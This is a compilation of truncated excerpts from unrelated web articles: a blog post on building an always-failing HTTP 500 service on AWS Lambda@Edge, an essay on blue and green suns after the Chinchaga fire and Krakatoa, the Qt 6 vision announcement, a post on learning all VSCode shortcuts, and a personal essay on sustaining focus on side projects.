    <span>headers</span><span>:</span> <span>{</span> <span>'</span><span>content-type</span><span>'</span><span>:</span> <span>'</span><span>text/html</span><span>'</span> <span>},</span>
  <span>});</span>
<span>}</span>
</code></pre></div></div> <p>Deploying it was easy too. The problem came shortly after when I tried to add my new Worker URL to my AWS Route53 DNS records so that I could use the 500asaservice.com domain for it. The bad news is that Cloudflare won’t allow you to do this, unless you pay them a shed load of money. So that was the end of my adventure with Cloudflare Workers. At this point I decided to return to AWS to see what they could do for me. And easy enough, they have something pretty similar to Cloudflare Workers. It’s called Lambda@Edge and it allows you to run Lambda functions within CloudFront itself.</p> <p>With barely no changes to my original Lambda code, I set up a new CloudFront distribution. The origin for the distribution is inconsequential since every single response will be generated within the Lambda so I just gave it a made-up one. Then, all I had to do was to set up a CloudFront <code>viewer-request</code> event as the trigger for my Lambda and deploy the distribution. Once I got everything working, I encoded the configuration in a <code>serverless.yml</code> so it was easier to change and deploy. And that was pretty much it. I now have a Lambda function which runs atop Amazon’s ubiquitous and nearly infallible CDN. It costs me almost nothing to run it (provided it doesn’t start serving huge amounts of traffic) and requires no maintenance at all. I’m so confident of the performance and uptime (downtime?) of my application that I even published <a href="https://github.com/dvejmz/500aas#sla">an SLA for it</a>.</p> <p>There are still a couple of bugs in my application. Excuse me, bugs in an app that was built to fail? Yup, it turns out, 500aaS does not always return a HTTP 500 status code. It can still be susceptible to malformed HTTP requests, which will force CloudFront to step in and return a HTTP 400 error instead, bypassing the Lambda altogether (this is why my SLA does not promise 100% downtime). This is something I could perhaps fix by overriding the custom error responses CloudFront returns, but they seem to be set up as a function of the origin response, so I don’t know if they would work with Lambda@Edge. Still a work in progress.</p> <p>If you’re interested in checking out how 500aaS was built, you can browse the <a href="https://github.com/dvejmz/500aas">repository on GitHub</a>. Pull requests and suggestions welcome. I even set up a GitHub Actions pipeline to run a test to ensure it always fails. Because I have standards, you know?</p>  </div> </article>  </div></div>]]>

<p>Just after 4pm, the phones started ringing at the Royal Observatory on Blackford Hill. Caller after caller reported seeing the sun. The date was September 27, 1950, and the place was Edinburgh, Scotland. Seeing the sun in Scotland can be a bit of a rarity, but even the Scots knew that the sun should not look like this. Over a quarter of an hour, the sun had turned bright blue, while the sky took on a bronze colour. The Scotsman reported “<span><em>All over Edinburgh, on the streets and in suburban districts, people stopped to gaze at the sapphire sphere shining in a greyish-white sky.</em></span>” The Astronomer Royal requested an airplane to investigate. Above 10 kilometer altitude, the sun was its usual yellow. Below that, it was distinctly blue. In between, a layer of smoke seemed present. The phenomenon lasted until 6:30pm when the sun regained its normal hue. But later that evening, when the moon rose, it too was blue. A young Patrick Moore wrote “<em><span>The moon was in a slightly misty sky and had a kind of lovely blue colour comparable to the electric glow discharge. I never saw something similar before.</span>” </em> Indeed, nothing like it had been seen since the blue sun of August 18, 1821 had appeared in the skies of southern England.</p>

<p>The cause of the 1950 discolouration was across the Atlantic, in Alberta, Canada. A forest fire had been burning there since June but it had largely been left alone: fire fighters were told to only tackle fires within 10 miles of a town. By September, the deflagration had become huge and late September, the sun over eastern Canada went out, hidden behind the dense smoke. The Chinchaga firestorm had grown into the biggest wildfire on record in North America (it still is). The smoke particles blew over the Atlantic, and when the haze reached the UK, the sun turned blue.</p>
<p>Whilst blue suns are very rare, red suns are more common. In October 2017, as the UK was hit by a post-tropical hurricane, the sky went yellow and the sun red. It was quite an amazing sight. It was also amazing to see the students just looking down at their phones, rather than up at the sky. Perhaps in their on-line world, the colour of the sun is of no particular interest. We can teach our students to think, but it has become harder to teach them to see. The red sun was caused by a combination of dust from the Sahara and smoke from forest fires in Portugal, caught by the hurricane.</p>
<p>Red suns amidst hazy skies had also been a feature of the dry fogs of the Laki eruption, in 1783. But the most famous instant of strangely coloured suns happened in 1883, when the eruption of Krakatoa painted the sky world-wide in unworldly colours. Let’s have a look.</p>
<h2>Krakatoa</h2>

<p>The <a href="http://www.volcanocafe.org/krakatoa-a-blast-from-the-past/">eruption</a> had been a terrible one. Captain Watson of the ship Charles Ball was in the vicinity, and he wrote a vivid account of the events.</p>
<p>“<span><em>The night was a fearful one: the blinding fall of sand and stones, the intense blackness above and around us, broken only by the incessant glare of varied kinds of lightning, and the continued explosive roars of Krakatoa made our situation a truly awful one.</em></span></p>
<p><span><em>“At eleven P.M., having stood off from the Java shore, with the wind strong from the S. W., the island, being W. N. W. distant eleven miles, became visible. Chains of fire appeared to ascend and descend between it and the sky, while on the S. W. end there seemed to be a continued roll of balls of white fire. The wind, though strong, was hot and choking, sulphurous, with a smell as of burning cinders, some of the pieces falling on us being like iron cinders. The lead came up from the bottom at thirty fathoms quite warm.</em></span></p>
<p><span><em>“At 11.15 </em>[a.m]<em> there was a fearful explosion in the direction of Krakatoa, then over thirty miles distant. We saw a wave rush right on to the Button island, apparently sweeping entirely over the southern part, and rising half-way up the north and east sides, fifty or sixty feet, and then continuing on to the Java shore. This was evidently a wave of translation, and not of progression, for it was not felt at the ship. This we saw repeated twice, but the helmsman said he saw it once before we looked. At the same time the sky rapidly covered in; the wind came out strong from S. W. to S., and by 11.30 A. M. we were enclosed in a darkness that might almost be felt; and then commenced a downpour of mud, sand, and I know not what, the ship going N. E. by N. seven knots per hour under three lower topsails. We set the side lights, placed two men on the lookout forward, the mate and second mate on either quarter, and one man washing the mud from the binnacle glass. We had seen two vessels to the N. and N. W. of us before the sky closed in, which added not a little to the anxiety of our position.</em></span></p>
<p><em><span>At noon the darkness was so intense that we had to grope our way about the decks, and although speaking to each other on the poop, yet we could not see each other. This horrible state and downpour of mud and debris continued until 1.30 P.M., the roaring and lightning from the volcano being something fearful. By two P.M. we could see some of the yards aloft, and the fall of mud ceased; by five P.M. the horizon showed out to the northward and eastward, and we saw West Island bearing E. by N., just visible. Up to midnight the sky hung dark and heavy, a little sand falling at times, and the roaring of the volcano very distinct, although we were fully seventy-five miles from Krakatoa.</span>”</em></p>

<p>Soon dust was falling over much of the Indian Ocean. It was the 27<sup>th</sup> of August 1883, and Indonesia had just lost one of its islands. The explosion had been horrendous, and the death toll terrible. And Krakatoa was only a VEI 6! This was the first significant volcanic eruption, and the first major catastrophe, in the time of instant communication. The Dutch Java Bode published the stories on the same day of the eruption. English newspapers soon followed. The complete destruction of the town of Anjer was especially newsworthy. Even with the new telegraph links, the confirmed information could still be limited. ”<span>All gone. Plenty lives los</span>t”, read the content of one such message, leaving the journalists with some creative writing to be done. They rose to the challenge.</p>

The 16 active, towering new volcanoes formed by creative writing.</p></div>
<h2>The world in colour</h2>
<p>But now the eruption was over, and the experience of a life time began, one that covered the world in colour. Already before the main eruption, there had been an effect in the skies. Watson had noticed peculiar red sunsets while in the South Atlantic several weeks before the main eruption, perhaps related to the earlier activity. And a week before the main eruption, as Krakatoa’s activity was getting stronger, he wrote</p>
<p>“<em><span>about seven P.M. on the 22d of August, in latitude 15° 30′ S. and longitude 105° E., the sea suddenly assumed a milky-white appearance, beginning to the eastward, but soon spreading all around, and lasting until about eight P.M. There were some cumulus clouds in the sky, but many stars were shining, and from E. to N. N. E. a strong white haze, or silvery glare; this occurred again between nine and ten P.M., but disappeared when the moon rose. The clouds appeared to be edged with a pinkish-colored light; the sky also seeming to have extra light in it, as when the Aurora is showing faintly.</span>”</em></p>
<p>But the effects became incomparably stronger after the main explosion. A passenger on a sea liner wrote</p>
<p><em>“<span>The sky was continually of a green colour for some days […] the sunrises and sunsets were indescribably beautiful, tinged with every shade of green not simply at the place of rising and setting, but thrown back on the rolling clouds all around the horizon. […] I thought it was nothing more than fine particles of mineral substances which had been forced up into the clouds by the volcano, and carried along above the region of the earth’s influence. The phenomena lasted until we had entered the Red Sea, at a distance of between 3,000 and 4,000 miles from Anjer.”</span></em></p>
<p>And two weeks after the eruption, on September 9, 1883, north of Borneo, Watson reported that the sun rose perfectly green, and that the moon and the stars gave a green light as well. The strangeness had begun.</p>
<h2>Suns of colour</h2>
<p>The coloured suns had begun during the early sputterings of Krakatoa, long before the major eruption. Within days after the initial explosions on 20<sup>th</sup> May, a report from the ship Elisabeth, near Krakatoa, reads “<span><em>After this followed a rain of a very fine grey-yellowish dust which penetrated everything, and which continued to fall until the night between the 21st and 22nd of May. On the morning of the 21st the light was that which prevails during an eclipse of the sun; the sky presented the aspect of a large dome of very thin opal glass, to the vault of which the sun seemed suspended as a pale blue globe.</em>” <span>A nearby ship reported</span> “<em>The sun looked like dull silver.</em></span>”</p>
<p>After the final, destructive Krakatoa explosions, the reports of strangely coloured suns multiplied, and began to spread around the tropics. The first report was already on Aug 27, from a small region in Sri Lanka, where the sun became green. Initially, coppery, silvery, and even a leaden sun were reported. This was closer to Krakatoa and only in the first days, apart from one report from Tokyo on August 30, apparently at the receiving end of a narrow high-altitude air stream. Once the densest dust clouds had dissipated, the other colours began to appear. A blue sun was seen in the northern part of South America, from Panama to Parimaribo, on Sept 2. In Honolulu, on Sept 5, the sun went green. In Sri Lanka, a green sun was seen on Sept 9 and again on Sept 22. The Red Sea had a green sunrise on Sept 10 and a blue sunset on Sept 24. A green …</p></div></div>

                            </p>
                            
                            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>7 years ago, Qt 5 was released. Since then, a lot of things have changed in the world around us, and it is now time to define a vision for a new major version. This blog post captures the most important points that can and should define Qt 6.</p>
<!--more-->
<p>Qt 6 will be a continuation of what we have been doing in the Qt 5 series and should as such not be disruptive to our users. But a new major version will give us a higher degree of freedom to implement new features, functionality and better support the requirements of today and tomorrow than we currently can within the Qt 5 series. As described in more detail below, Qt 6 will aim for a large degree of compatibility with the Qt 5 series. We are also still working on new versions of Qt 5, and we’re aiming to bring some of the features that will define Qt 6 in a slightly reduced form to Qt 5.14 and Qt 5.15 LTS. With the feature freeze of Qt 5.14, more R&amp;D focus will shift towards Qt 6, and we’re aiming to have Qt 6.0 ready for a first release by the end of 2020. Before we dive into all the things that will be new, let’s also remember some of the core values of Qt for our users, to define the things we don’t want to change.</p>
<h3>What makes Qt valuable to our users?</h3>
<p>Qt is a horizontal product that is being used in many different markets. The core values Qt has for our customers and users are:</p>
<ol>
<li>Its <strong>cross-platform</strong> nature, allowing users to deploy their applications to all desktop, mobile and embedded platforms using one technology and from a single code base</li>
<li>Its <strong>scalability</strong> from low-end, single-purpose devices to high-end complex desktop applications or connected system</li>
<li><strong>World-class APIs and tools and documentation</strong>, simplifying the creation of applications and devices</li>
<li><strong>Maintainability, stability, and compatibility</strong>, allowing to maintain large code bases with minimal effort</li>
<li>A large <strong>developer ecosystem</strong> with more than 1 million users</li>
</ol>
<p>A new version of Qt needs to adjust our product to new market demands while keeping the 5 items above at the heart of what we’re doing.</p>
<p>The desktop market is at the root of our offering and is a strong and important market for Qt. It is where most of our users get the first contact with Qt and forms the basis of our tooling. Keeping it healthy and growing is a pre-requirement to be able to grow also in other markets.</p>
<p>Embedded and connected devices are where we have our biggest growth. Touch screens are coming to an exponentially increasing number of devices, but there is strong pressure on the price point of the hardware for these devices. Low-end chipsets, microcontrollers, combined with small to medium-sized touch screens will be used everywhere. Most of those devices will have relatively simple functionality but require polished and smooth user interfaces. Large volumes of such devices will be created, and we need to ensure we can target that space with our offering to be able to live up our scalability promise.</p>
<p>At the same time, user interfaces at the high end of the device spectrum will continue to increase in complexity, containing thousands of different screens and many applications. Merging 2D and 3D elements into one user interface will be common, as will be the usage of augmented and virtual reality.</p>
<p>Elements of artificial intelligence will be more commonly used in applications and devices, and we will need to have easy ways to integrate with those.</p>
<p>The strong growth in the number of connected devices being created as well as much higher requirements on user experience makes it more important for us to focus on world-class tooling to simplify the creation of applications and devices. Integrating UX designers into the development workflow is one of our goals, but there will be many other areas where we need to try to simplify the lives of our users.</p>
<p>Qt 6 will be a new major version for Qt. The main goal with such a new major version is to prepare Qt for the requirements coming in 2020 and beyond, clean up our codebase and make it easier to maintain. As such the focus will be on those items that require architectural changes within Qt and cannot be done without breaking some level of compatibility with Qt 5.x.</p>
<p>Below are some of the key changes we need to make in Qt to make it fit for the next years to come.</p>
<a id="qml" data-hs-anchor="true"></a>
<h3>Next-generation QML</h3>
<p>QML and Qt Quick have been the main technologies fueling our growth over the last years. The intuitive ways of creating User Interfaces using those technologies are a unique selling point of our offering.</p>
<p>But QML, as it was created for Qt 5, has some quirks and limitations. This, in turn, means that there is the potential for significant enhancements, that we are planning to implement with Qt 6. The main changes planned here are:</p>
<p><strong>Introduce strong typing.&nbsp;</strong>Weak typing makes it hard for our users to apply large changes to their codebases. A strong type system allows for IDEs and other tools to support our users in this task and dramatically ease the maintenance. Also, we will be able to generate much better-performing code and reduce overhead.</p>
<p><strong>Make JavaScript an optional feature of QML.&nbsp;</strong>Having a full JavaScript engine when using QML can complicate things and is an overhead especially when targeting low-end hardware such as microcontrollers. It is however extremely useful in many use cases.</p>
<p><strong>Remove QML versioning.</strong>&nbsp;By simplifying certain lookup rules in QML and changing the way context properties work, we can remove the need for versioning in QML. This, in turn, will lead to large simplifications in the QML engine, greatly simplify our workload of maintaining Qt Quick and simplify usage of QML and Qt Quick for our users</p>
<p><strong>Remove the duplication of data structures between QObject and QML<br></strong>Currently, quite some data structures are duplicated between our meta-object system and QML, degrading startup performance and increasing memory usage. By unifying those data structures, we will be able to cut away most of that overhead.</p>
<p><strong>Avoid runtime generated data structures.&nbsp;</strong>This relates to the point before, where many of those duplicated data structures are currently being generated at runtime. It should be perfectly possible to generate most of them at compile time.</p>
<p><strong>Support compiling QML to efficient C++ and native code.&nbsp;</strong>With strong typing and simpler lookup rules we can convert QML to efficient C++ and native code, significantly increasing runtime performance</p>
<p><strong>Support hiding implementation details.&nbsp;</strong>‘Private’ methods and properties have been a long-time requirement to be able to hide data and functionality in QML components</p>
<p><strong>Better tooling integration.&nbsp;</strong>Our current code model for QML is often incomplete, making refactoring, and detection of errors at compile time difficult to impossible. With the above changes, it should be possible to offer compile-time diagnostics that can compete with C++, as well as much improved refactoring support.</p>
<a id="graphics" data-hs-anchor="true"></a>
<h3>Next-generation graphics</h3>
<p>A lot of things have changed in the graphics area since we did Qt 5.0, leading to us having to do significant changes to our graphics stack to stay competitive.</p>
<p>With Qt 5, we used OpenGL as the unified API for 3D graphics. Since then a host of new APIs have been defined. Vulkan is the designated successor of OpenGL on Linux, Apple is pushing for Metal, and Microsoft has Direct 3D. This means that Qt will in the future have to seamlessly work with all those APIs. To make that possible a new layer abstracting the graphics APIs (like QPA for the platform integration) called the Rendering Hardware Interface (RHI) has to be defined. We will need to base all our rendering infrastructure (QPainter, the Qt Quick Scenegraph, and our 3D support) on top of that layer.</p>
<p>The set of different graphics APIs also leads to us having to support different shading languages. The Qt Shader Tools module will help us to cross-compile shaders both at compile and at runtime.</p>
<p>3D is playing a more and more important role, and our current offering doesn’t have a unified solution for creating UIs that contain both 2D and 3D elements. Integrating QML with content from Qt 3D or 3D Studio is currently cumbersome and causes some performance overhead. In addition, it is impossible to sync animations and transitions on a frame by frame level between 2D and 3D content.</p>
<p>The new integration of 3D content with Qt Quick is aiming to solve this problem. In this case, a full new renderer will allow rendering 2D and 3D content together and support arbitrary nesting between the two. This will turn QML into our UI definition language for 3D UIs and remove the need for the UIP format. We will provide a technology preview of the ‘new’ Qt Quick with 3D support already with Qt 5.14, more information will come in a separate blog post.</p>
<p>Finally, the new graphics stack needs to be supported by a decent pipeline for graphical assets, that allows preparing those at compile time for the target hardware and use cases in question. Convert PNG files to compressed textures, compile many of them into texture atlases, convert shaders and meshes into optimized binary formats and more.</p>
<p>We also aim to bring a unified theming/styling engine to Qt 6, which will allow us to get a native look &amp; feel on Desktop and mobile platforms to both Qt Widgets and Qt Quick.</p>
<a id="tooling" data-hs-anchor="true"></a>
<h3>Unified and consistent tooling</h3>
<p>Our graphical tooling to create User interfaces has been split into two with Qt 3D Studio and Qt Design Studio. Additionally, Qt 3D Studio is slightly disconnected from the rest of Qt leading to quite some duplicated efforts.</p>
<p>We will unify those by merging the required functionality from Qt 3D Studio back into Design Studio. Design Studio shares a lot of code and the application/plugin framework with Qt Creator allowing for a great design experience and giving us the tools to bridge the gap between designers and developers.</p>
<p>The Design tooling also …</p></span></p></div></div>

November 27, 2020 | https://tkainrad.dev/posts/learning-all-vscode-shortcuts-evolved-my-developing-habits/ | <a href="https://web.archive.org/web/*/https://tkainrad.dev/posts/learning-all-vscode-shortcuts-evolved-my-developing-habits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="contentdiv">

<p>I spent a few hours spread over the last couple of weeks to learn every single one of VSCode’s keyboard shortcuts, specifically the 149 shortcuts from the <a href="https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf">official keyboard shortcuts reference</a>. These are also present in <a href="https://keycombiner.com/collections/vscode/">KeyCombiner’s searchable table of VSCode shortcuts</a>.</p>
<p>Admittedly, I started this challenge to write a blog post about it afterward and as a way to promote <a href="https://keycombiner.com/">KeyCombiner</a> via content marketing. The blog post I had in mind would be similar to my previous one, <a href="https://tkainrad.dev/posts/how-i-learned-50-new-keyboard-shortcuts-in-42-minutes/">documenting my process of learning 50 new web application shortcuts in 42 minutes</a>.</p>
<p>But, as it usually happens only in romantic comedies, my intentions changed over time. This article turned out much different. It is not about the learning process but about how this challenge changed some of the developing habits I had for many years. Workflows that I grew used to during many projects, different IDEs, and even varying programming languages suddenly evolved.</p>

<p>As software engineers, we like to think that we are continually learning and improving our skills. This is certainly true when it comes to the technologies we are using. However, our development habits, such as which features of our IDEs we use, are much more rigid. I believe most of our core workflows are formed early on and very hard to change.
I don’t have data to back this up, but when I look at myself, my co-workers, and other developers I know, this certainly seems true. If you think about it, it is not surprising, the same thing happens in other areas of life. For this very reason, you will find that developers who have studied or worked together will often use similar shortcuts, similar IDE features, and have similar limitations in their workflows.</p>
<p>The usual way to combat this is reading books, blog posts, attending conferences, well, everything that is used in our industry to extend our knowledge. However, with fundamental developing habits, I have found that this works poorly. You might read about a neat feature of your IDE, or see someone demo their workflow, but when you are eventually sitting in front of your screen and writing code, it is easy to fall back to what we already know, what is already set up, and proven to work.</p>
<p>After this experiment, I am convinced that keyboard shortcuts are the main factor in how we form our developing habits, and they can also stop us from evolving our habits.
Even before this challenge, I felt that I was good with shortcuts. I knew quite a few refactoring shortcuts, knew how to pause and stop program executing during debugging, was decent at jumping around between files, searching through my project, and all the other usual stuff. When I saw a co-worker using a shortcut that I didn’t know, I was quick to incorporate it into my workflow, too. After all, I was enough into shortcuts that I built a whole side-project around learning them.
<strong>The thing is, all new shortcuts that I learned were the ones that would augment my existing habits.</strong></p>
<p>This is a hen and egg problem; if you don’t know the shortcuts, you will not start to change your habits and use new IDE features because without shortcuts, they are too tedious to use or not at all usable. But if you don’t form new habits, you will not learn the shortcuts.</p>
<p><strong>Without intending it, I think I found a way to break out of this cycle:
Learning all IDE shortcuts very well <em>before</em> getting back to work. By learning <em>all</em> shortcuts, you are not limited to what somebody shows you and might not be compatible with your situation. You can naturally include what makes sense, in addition to your existing skills.</strong></p>
<p>The next section shows how this worked for me.</p>

<p>I started the learning process as it is usually done with KeyCombiner: By importing some shortcuts from the <a href="https://keycombiner.com/collections/vscode/">public collection of VSCode shortcuts</a> into a personal collection. Intuitively, I started with the ones I already knew and some additional that seemed most useful to me. Back then I was still trying to show that I could learn all shortcuts very quickly with KeyCombiner. I didn’t expect that shortcuts that had nothing to do with my existing workflows will be the real deal.</p>
<p>Some of the first combinations that I picked and that I did not know previously were <kbd>alt</kbd>+<kbd>w</kbd>/<kbd>r</kbd>/<kbd>c</kbd> for toggling find options (match whole word, regex, case sensitivity) because I was already using those features. This went on for a few days. I did a couple practice runs every day and added new shortcuts whenever KeyCombiner was saying that I mastered all of the previous ones.</p>
<p>Eventually, I knew all shortcuts that seemed useful for how I was using VSCode back then. So I had to start adding shortcuts that had nothing to do with my existing habits. This brought up an interesting misconception. Often keyboard shortcuts are seen as a way to do things faster, compared to using the mouse. While that is true, I think there is an even more aspect to shortcut usage in IDEs: Many features are not used at all, if you don’t know the shortcut!</p>
<p>As I was learning new VSCode shortcuts every day, I started to use features that I previously didn’t even know of. One of the first things that suddenly made a lot of sense was <em>Select all Occurences of Find Match</em> with <kbd>Alt</kbd>+<kbd>Enter</kbd> as default binding, especially when combined with regex search. I was so excited about it, that I even <a href="https://twitter.com/ThomasKainrad/status/1305608337799761920">tweeted a Gif</a> showing how I use it to modify the CSV files that are the source for KeyCombiner’s public collection tables.</p>
<p>The process worked both ways: Sometimes, while I was practicing a shortcut on KeyCombiner, it seemed apparent that this was useful and that I should include it into my workflow. Sometimes it hit me while coding that I had just learned a shortcut that can make the current task more efficient.</p>
<p>In the following, I describe the most significant changes in my daily development habits. The list is far from complete though; there are many more small things that I picked up and frequently use now.</p>
<p><strong>Editor and Panel Management</strong><br>
Since knowing all the shortcuts to switch focus between panels and move editors around, I am using VSCode’s powerful layouting capabilities much more. I have 3-5 editor panels open at pretty much all times, seeing many related pieces of code at once. Working this way by using the mouse is very impractical.
I switch between editor panels with keyboard shortcuts and move editors from one group to the other.</p>
<p>There is one negative side-effect, though: I am starting to get annoyed when I use other IDEs (PyCharm, Eclipse), because they lack far behind VSCode when it comes to using multiple editors.</p>
<p><strong>Multi-cursor Editing</strong><br>
If you don’t know the shortcut to add additional cursors, I doubt you will ever use this incredibly powerful feature of VSCode. It is a typical feature that only blends into your habits once you know the shortcuts.
The basic commands are <kbd>Ctrl</kbd>+<kbd>Ctrl</kbd>+<kbd>Down</kbd>/<kbd>Up</kbd> for adding cursors above/below. However, I found the commands to <em>Insert cursor at end of each line selected</em> (<kbd>Shift</kbd>+<kbd>Alt</kbd>+<kbd>i</kbd>), and the above-mentioned <em>Select all Occurences of Find Match</em> (<kbd>Alt</kbd>+<kbd>Enter</kbd>) even more powerful. These commands are why I frequently paste text snippets into VSCode, apply a few operations, and then copy-paste it back into whatever application I was using.</p>
<p><strong>Opening views by shortcut</strong><br>
I sometimes tried to do this before, but it never stuck. Now I finally switch to all views (Explorer, Debug, Search, Problems, etc.) with dedicated keyboard shortcuts. These shortcuts translate very nicely to other IDEs. After learning the VSCode default bindings, which are <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>&lt;char&gt;</kbd>, I set the same bindings also for Eclipse and PyCharm. Especially <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>e</kbd> for switching to the explorer view and <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>d</kbd> for switching to the debug view are among my most used shortcuts now.</p>
<p><strong>Making Selections</strong><br>
I hate to admit it, but I did not use shortcuts to expand and shrink AST selections before. AST stands for <em>abstract syntax tree</em>, which means that the IDE will take the current language’s syntax into account for modifying the selection. Finally, I picked up <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>left</kbd>/<kbd>right</kbd> to shrink and expand selections. Not all IDEs handle this in the same way, which can be a bit annoying, but it works well for the most frequent tasks, such as expanding the selection to enclose the current string, method, class, or HTML tag.</p>
<p><strong>Folding</strong><br>
I have started to use folding much more. For years, I have rarely used this feature that all IDEs support to a great extent. Now, I do it frequently. Folding is one of these things that are just not feasible with the mouse. Of course, if you need to fold code, <a href="https://blog.codinghorror.com/the-problem-with-code-folding/">chances are that you need to structure your code better</a>. Many organizations even apply automatic code linters that will complain when methods or classes are too long. However, I have never seen someone recommend splitting up blog posts into multiple files. The same goes for other non-code file types, such as JSON. All we have there is folding.</p>
<p>I am not saying these are the things you should start to learn now, far from it. These are the things I personally integrated deep into my workflows after doing this challenge, without choosing them deliberately, but naturally. Who knows what you will pick up.</p>
<p>Of course, some of the shortcuts I learned still seem a bit, let’s say nonessential, but a little useless knowledge never killed nobody.</p>

<p>In addition to finally breaking out of old habits and experience a real evolution of my IDE usage, there were some additional, less significant, but still delightful second-order effects.</p>
<p>As a shortcut enthusiast, I often had the problem that I needed to decide which binding to use for a particular operation and application pair. KeyCombiner’s public shortcut search helps to find out which binding is the convention for a particular operation, but it can still be tricky. For example, take the frequently used <em>Step Over</em> operation used for debugging. <a href="https://keycombiner.com/collecting/collections/public/search/?description=step+over&amp;keys=&amp;mac_keys=&amp;submit=Search">KeyCombiner shows that VSCode, Eclipse, and JetBrains IDEs all use a different default binding</a>(<kbd>F6</kbd>,<kbd>F8</kbd>,<kbd>F10</kbd>). Learning every single VSCode shortcut has freed me from this mental load of deciding what the best …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Side Projects</h2>
<p>I can't stick to side projects. I start and stop new ones all the time.</p>
<p>I dislike this about myself. I do just fine in a work environment, but not so fine when I get home and work on my personal side projects.</p>
<p>I have a long-term, macroscopic focus problem when it comes to my interests.</p>
<p>I am going to try and solve that.</p>
<h2>The Long-Term Focus Problem</h2>
<p>I've thought a lot about <em>short-term</em> focus.</p>
<p>I'm proficient at answering questions like: </p>
<blockquote>
<p>How do I stay focused on my project for the next few weeks?</p>
</blockquote>
<p>But I have no clear answer for something like:</p>
<blockquote>
<p>How do I stay focused on my project for the next three years?</p>
</blockquote>
<p>It's not that I can't focus, it's that I can't <em>stay focused</em> over longer periods of time. Especially on personal projects.</p>
<p>I can do this:</p>
<blockquote>
<p>Finish the essay before Friday.</p>
</blockquote>
<blockquote>
<p>Finish the new feature for our app, test it, launch on Tuesday.</p>
</blockquote>
<blockquote>
<p>Build a product roadmap and stick to it for the next 18 months</p>
</blockquote>
<p>But I can't do this:</p>
<blockquote>
<p>Practice piano once a week for the next 3 years</p>
</blockquote>
<blockquote>
<p>Read 1 book every month in 2020</p>
</blockquote>
<blockquote>
<p>Build a personal roadmap and stick to it for the next 18 months</p>
</blockquote>
<p>I get enthralled about the idea of learning piano or reading more books. I pursue these new interests with furious passion. A few weeks later, they fizzle out. It's not a concious decision, it's almost like I forget about them.</p>
<p>I'm going to explore this problem, fix it, and then write about it.</p>
<h2>But What About Roadmaps?</h2>
<blockquote>
<p>...but Rob I thought you are a <em>product manager</em>? Isn't it your job to be thinking long-term? Don't you create product roadmaps?</p>
</blockquote>
<p>As a product manager at a tech company, the single most important tool for myself has always been the product roadmap. I routinely sit down with relevant people (usually the CEO + engineering lead) and we create a plan for journey ahead. </p>
<p>Creating a "personal roadmap" is the first thing I tried. It works perfectly on a professional level, but there is one specific reason why it's been unsuccessful on a personal level.</p>
<p>Businesses have strong, structural incentives to maintain their product, goals, and identity. </p>
<ul>
<li><strong>Product</strong>: <em>"Our product solves <code>&lt;problem&gt;</code> for <code>&lt;target market&gt;</code> with <code>&lt;solution&gt;</code>"</em></li>
<li><strong>Goal</strong>: <em>"Make $10,000,000 in annual recurring revenue"</em></li>
<li><strong>Identity</strong>: <em>"We create a delightful, user-friendly <code>&lt;product&gt;</code> for our <code>&lt;target market&gt;</code> to help them solve their <code>&lt;problem&gt;</code>"</em></li>
</ul>
<p>All incentives align to keep these three attributes <strong>static</strong>. Especially identity.</p>
<p>When I get to work, I naturally adopt the identity of my organization. This identity has no incentive to change.</p>
<blockquote>
<p>I, Robert, help make <code>&lt;company identity&gt;</code> a reality by doing <code>&lt;product manager stuff&gt;</code>.</p>
</blockquote>
<p>There are no other thoughts that cross my mind. I love being a part of a team and working towards accomplishing goals. I love shipping products, and my persistence in this role makes me better at it.</p>
<p>I'm simplifying, but the static nature of a company's identity enables long-term focus in a way I haven't been able to replicate a personal level. It's why a "personal roadmap" doesn't work the same way a product roadmap does. I don't have a static identity for my personal projects.</p>
<h2>Identity Incentives</h2>
<p>Here's a simplified example of one attempt, for which I created a personal roadmap.</p>
<ul>
<li><strong>Product</strong>: <em>"A video game."</em></li>
<li><strong>Goal</strong>: <em>"Create a roguelike action game in my spare time, and release it on Steam"</em></li>
<li><strong>Identity</strong>: <em>"I am a game developer who creates exciting, delightful, engaging video games in my spare time."</em></li>
</ul>
<p>Creating a video game is a long-term project, especially if you haven't done it before. It's like learning to play guitar and produce/mix an album at the same time.</p>
<p>I created a roadmap, but I didn't stick to it. My momentum fell off a cliff after I finished the first milestone (in this case, a prototype). I found some new incentive to start a different project and immediately dropped the video game project. Some shiny new object entered my field of view, and that was that.</p>
<p>In my book, I recommend that people ignore any failures in their habits in order to preserve a successful identity:</p>
<blockquote>
<p>I skipped my morning run today, but I'm <em>still</em> someone who is a runner.</p>
</blockquote>
<blockquote>
<p>I didn't work on my video game this weekend, but I'm <em>still</em> a game developer.</p>
</blockquote>
<p>I never addressed how to maintain the identity itself. My recommendations had a built in assumption that the reader's given identity is static:</p>
<ul>
<li>I study because I am a student</li>
<li>I write code because I am a back-end engineer</li>
<li>I run Facebook Ads because I am a digital marketer</li>
</ul>
<p>When the identity is based on a personal interest instead of a professional role, there are fewer incentives to keep it static over the long-term.</p>
<h2>Debunked Reasons</h2>
<p>The reason I think it's an identity issue is because I have eliminated the following factors:</p>
<ul>
<li><strong>External validation</strong>: my friends liked my prototype and wanted to see more</li>
<li><strong>Difficulty</strong>: I did not lose interest when things got harder, in fact they got easier as I learned more)</li>
<li><strong>Time/Energy</strong>: I switched to a new interest with similar intensity. I was not burned out.</li>
<li><strong>Motivation</strong>: I think identity and purpose drives motivation. Also, I like making stuff.</li>
</ul>
<h2>The Malleable Identity Issue</h2>
<p>Now that I'm writing this all down, it's clear that my long-term focus problem is truly identity problem. The identity I adopt when starting personal projects is too <em>malleable</em> to persist in the long-term.</p>
<p>There are some benefits. I've started many side projects and now I have a novice-level understanding of many different things.</p>
<p>As a product manager in tech, this is a good thing. I can code, design mockups, use 3d modelling software, use deep learning tools like <a href="https://en.wikipedia.org/wiki/GPT-3">GPT2</a>, and so on. I'm no expert, but I understand how all of these work to some degree.</p>
<p>On the other hand, I have many projects I would have loved to continue. I'm not full of regret, but I wish I had a solution to my rapidly changing interests.</p>
<h2>Rabbit Holes?</h2>
